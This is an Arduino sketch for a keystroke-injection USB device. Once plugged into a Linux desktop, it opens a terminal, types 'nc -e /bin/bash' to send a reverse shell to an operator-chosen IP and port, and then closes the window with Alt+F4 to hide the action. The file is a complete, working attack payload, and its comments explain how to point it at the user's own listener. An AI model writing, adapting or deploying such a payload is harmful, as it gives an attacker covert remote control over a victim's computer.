#include <Keyboard.h>


void setup() {
  // put your setup code here, to run once:
  
pinMode(3, INPUT_PULLUP);     //If switch is pushed, enter programming mode (AKA infinite while loop)
if (digitalRead(3) == LOW) {
while(1);
}

Keyboard.begin();
delay(1000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.releaseAll();
delay(200);
Keyboard.print("terminal");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(400);

//Change 192.168.1.1 to the IP of your server, and 8080 to the port that is open on your firewall. 
Keyboard.print("nc -e /bin/bash 192.168.1.1 8080");    


Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();

Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(KEY_F4);
Keyboard.releaseAll();

}

void loop() {}






































